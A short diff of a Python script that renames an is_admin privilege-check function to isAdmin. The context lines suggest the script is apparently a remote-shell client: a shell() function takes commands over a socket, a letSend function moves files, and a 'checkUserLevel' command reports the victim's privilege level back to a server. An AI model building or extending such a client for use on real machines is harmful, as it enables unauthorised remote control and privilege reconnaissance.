@@ -87,7 +87,7 @@ def letSend(mySocket, path, fileName):
             f.write(bits)
 
 # https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
-def is_admin() -> bool:
+def isAdmin() -> bool:
     if os.name == "nt":
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     elif os.name == "posix":
@@ -110,7 +110,7 @@ def shell(mySocket):
 
         elif 'checkUserLevel' in command.decode():
             try:
-                if is_admin():
+                if isAdmin():
                     informToServer = '[!] Administrator Privileges'
                 else:
                     informToServer = '[!!] User Privileges. (No Admin privileges)'
